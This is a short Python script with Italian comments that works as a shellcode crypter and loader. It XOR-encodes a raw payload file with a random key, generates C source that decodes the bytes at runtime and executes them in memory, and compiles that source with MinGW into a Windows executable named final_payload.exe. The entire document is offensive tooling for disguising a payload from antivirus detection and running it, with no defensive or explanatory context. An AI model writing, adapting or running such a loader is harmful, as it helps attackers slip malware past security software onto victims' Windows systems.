import random
import os

def create_executable(payload_file, output_file):
    # Leggi il payload originale
    with open(payload_file, "rb") as f:
        payload = f.read()

    # Genera una chiave XOR casuale
    key = random.randint(1, 255)

    # Codifica il payload con XOR
    encoded_payload = bytearray([byte ^ key for byte in payload])

    # Crea il decoder in C
    decoder = f"""
    #include <windows.h>
    #include <stdio.h>
    unsigned char payload[] = {{
        {", ".join(f"0x{byte:02x}" for byte in encoded_payload)}
    }};
    int main() {{
        unsigned char key = {key};  // Chiave XOR
        int length = sizeof(payload);
        for (int i = 0; i < length; i++) {{
            payload[i] ^= key;
        }}
        void (*exec)() = (void (*)())payload;
        exec();
        return 0;
    }}
    """

    # Scrivi il codice C in un file temporaneo
    with open("decoder.c", "w") as f:
        f.write(decoder)

    # Compila il file C in un eseguibile usando MinGW
    os.system(f"x86_64-w64-mingw32-gcc -o {output_file} decoder.c")
    os.remove("decoder.c")

create_executable("base_payload.raw", "final_payload.exe")
